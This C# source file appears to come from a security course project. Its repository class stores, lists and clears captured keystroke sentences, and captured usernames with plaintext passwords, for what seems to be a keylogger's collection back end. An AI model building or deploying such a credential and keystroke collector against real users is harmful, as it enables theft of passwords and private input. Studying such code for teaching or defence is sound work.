using M183.BusinessLogic.ViewModels;
using M183.DataAccess;
using M183.DataAccess.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace M183.BusinessLogic
{
    public class Repository
    {
        private static DatabaseContext db = new DatabaseContext();

        public List<LoggedTextViewModel> GetAllKeyLogs()
        {
            return db.LoggedText
                    .Select(lt => new LoggedTextViewModel()
                    {
                        Id = lt.Id,
                        Sentence = lt.Sentence,
                        Timestamp = lt.Timestamp,
                    })
                    .OrderByDescending(lt => lt.Timestamp)
                    .ToList();
        }

        public void ClearAllAccounts()
        {
            db.LoggedAccount.RemoveRange(db.LoggedAccount);
            db.SaveChanges();
        }

        public List<LoggedAccountViewModel> GetAllAccounts()
        {
            return db.LoggedAccount
                    .Select(la => new LoggedAccountViewModel()
                    {
                        Id = la.Id,
                        Username = la.Username,
                        Password = la.Password, 
                        Timestamp = la.Timestamp,
                    })
                    .OrderByDescending(la => la.Timestamp)
                    .ToList();
        }

        public void ClearAllKeyLogs()
        {
            db.LoggedText.RemoveRange(db.LoggedText);
            db.SaveChanges();
        }

        public void SaveKeyLog(string sentence)
        {
            db.LoggedText.Add(new LoggedText()
            {
                Sentence = sentence,
                Timestamp = DateTime.Now,
            });
            db.SaveChanges();
        }

        public void SaveAccountLog(string username, string password)
        {
            db.LoggedAccount.Add(new LoggedAccount()
            {
                Timestamp = DateTime.Now,
                Username = username,
                Password = password,
            });
            db.SaveChanges();
        }
    }
}
